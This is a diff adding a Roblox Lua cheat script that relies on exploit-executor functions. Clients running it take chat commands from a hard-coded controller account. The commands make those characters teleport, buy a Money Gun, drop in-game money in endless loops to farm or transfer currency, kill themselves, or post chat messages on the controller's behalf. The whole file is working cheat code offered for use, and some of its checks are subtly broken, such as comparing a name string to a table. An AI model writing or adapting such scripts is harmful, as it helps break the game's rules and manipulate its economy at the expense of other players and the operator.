@@ -1,0 +1,292 @@
+repeat task.wait() until game:IsLoaded() and (game:GetService('Players').LocalPlayer.Character or game:GetService('Players').LocalPlayer.CharacterAdded:Wait())
+
+if syn then
+    
+end
+
+
+local plr = game:GetService('Players')
+local TeleportService = game:GetService('TeleportService')
+local StarterGui = game:GetService('StarterGui')
+local RunService = game:GetService('RunService')
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- // Local Variables \\
+local Settings = {}
+local lplr = plr.LocalPlayer
+local chr = lplr.Character
+local hrp = chr.HumanoidRootPart
+
+-- // List Variables \\
+local admins = {'K_eepitlit'}
+
+ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data)
+    -- // Get all of the data
+    local Player = plr[Data.FromSpeaker]
+    local Message = Data.Message
+    local Channel = Data.OriginalChannel
+
+    -- // Ignore if it is LocalPlayer as that event already fires
+    if (plr == lplr) then
+        return
+    end
+
+    -- // Fire
+    firesignal(Player.Chatted, Message, Channel)
+    --firesignal(Players.PlayerChatted, nil, Player, Message, nil)
+end)
+
+-- // Functions \\
+local function dropmoney(amount)
+    if chr then
+        game:GetService("ReplicatedStorage").MainEvent:FireServer("DropMoney", amount)
+    end
+end
+
+if lplr.Name ~= admins then
+    pcall(function()
+        local function admincmds(admin)
+            if game.Players:FindFirstChild(admin) then
+                game.Players:FindFirstChild(admin).Chatted:Connect(function(chat)
+                    if chat == '$bring all' then 
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
+                    end
+
+                    if chat == '$antilag all' then 
+                        if workspace:FindFirstChild('Ignored') and workspace:FindFirstChild('MAP') then
+                            workspace.MAP:Destroy()
+                            workspace.Ignored:Destroy()
+                            game:GetService("RunService"):Set3dRenderingEnabled(false)
+                        end
+                    end
+			  
+			        if chat == '$moneygun' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-886.594971, 21.6030636, -130.013474) * CFrame.Angles(math.rad(0),0,0)
+                        wait(2.0)fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Money Gun] - $800"].ClickDetector)
+                        wait(3.0)game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["[Money Gun]"])
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                    end
+			  
+			        if chat == '$dropbank' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-382.056702, 12.2480183, -281.862335) * CFrame.Angles(math.rad(-90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(10000)
+                            end
+                        end
+			        end
+		        
+                    if chat == '$moneybank' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-382.056702, 12.2480183, -281.862335) * CFrame.Angles(math.rad(90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(100)
+                                game.Players.LocalPlayer.Character["[Money Gun]"]:Activate()
+                            end
+                        end
+                    end
+			
+			        if chat == '$dropcourts' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-931.555115, 10.7708454, -481.936768) * CFrame.Angles(math.rad(-90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(10000)
+                            end
+                        end
+			        end
+                    
+                    if chat == '$moneycourt' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-931.555115, 10.7708454, -481.936768) * CFrame.Angles(math.rad(90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(100)
+                                game.Players.LocalPlayer.Character["[Money Gun]"]:Activate()
+                            end
+                        end
+                    end
+
+                    if chat == '$dropadmin' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-871.685181, -49.39785, -592.350891) * CFrame.Angles(math.rad(-90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(10000)
+                            end
+                        end
+                    end
+                    
+                    if chat == '$moneyadmin' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-871.685181, -49.39785, -592.350891) * CFrame.Angles(math.rad(90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(100)
+                                game.Players.LocalPlayer.Character["[Money Gun]"]:Activate()
+                            end
+                        end
+                    end
+
+    
+		            if chat == '$dropclub' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.586304, -15.21031904, -380.986206) * CFrame.Angles(math.rad(-90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(10000)
+                            end
+                        end
+		            end
+                
+                    if chat == '$moneyclub' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.586304, -15.21031904, -380.986206) * CFrame.Angles(math.rad(90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(100)
+                                game.Players.LocalPlayer.Character["[Money Gun]"]:Activate()
+                            end
+                        end
+                    end
+
+
+			        if chat == '$droptrain' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(643.293762, 36.498024, -75.9860229) * CFrame.Angles(math.rad(-90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(10000)
+                            end
+                        end
+			        end
+                
+                    if chat == '$moneytrain' then 
+                        for i,v in pairs(chr:GetChildren()) do
+                            if v:IsA('MeshPart') then
+                                v.CanCollide = false
+                            end
+                        end
+                        while task.wait() do
+                            if chr and chr:FindFirstChild('HumanoidRootPart') then
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(643.293762, 36.498024, -75.9860229) * CFrame.Angles(math.rad(90),0,0)
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
+                                dropmoney(100)
+                                game.Players.LocalPlayer.Character["[Money Gun]"]:Activate()
+                            end
+                        end
+                    end
+
+                    if chat == '$kill all' then 
+                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                    end
+                    
+                    if string.find(chat, '$bring') then 
+                        if chat ~= '$bring all' then 
+                            local findplr = chat:gsub("$bring ", '')
+                            if game.Players.LocalPlayer.Name == findplr then 
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild(admin).Character.HumanoidRootPart.CFrame
+                            end
+                        end
+                    end
+                    
+                    if string.find(chat, '$kill') then 
+                        if chat ~= '$kill all' then 
+                            local findplr = chat:gsub("$kill ", '')
+                            if game.Players.LocalPlayer.Name == findplr then 
+                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                            end
+                        end
+                    end
+
+                    if string.find(chat, '$chat all') then
+                        local findchat = chat:gsub('$chat all ', '')
+                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(findchat, 'All')
+                    end
+
+                    if string.find(chat,'$chat') then 
+                        if not string.find(chat, '$chat all') then 
+                            local findchat
+                            for i,v in pairs(game.Players:GetPlayers()) do
+                                if string.find(chat, v.Name) then 
+                                    findchat = chat:gsub(v.Name .. ' ', '')
+                                end
+                            end
+                            local newchat = findchat:gsub('$chat ', '')
+                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(newchat, 'All')
+                        end
+                    end
+                end)
+            end
+        end 
+
+        for i,v in pairs(admins) do
+            admincmds(v)
+        end
+        game.Players.PlayerAdded:Connect(function(v)
+            for i2, v2 in pairs(admins) do
+                if v.Name == v2 then 
+                    admincmds(tostring(v2))
+                end
+            end
+        end)
+    end)
+end
+
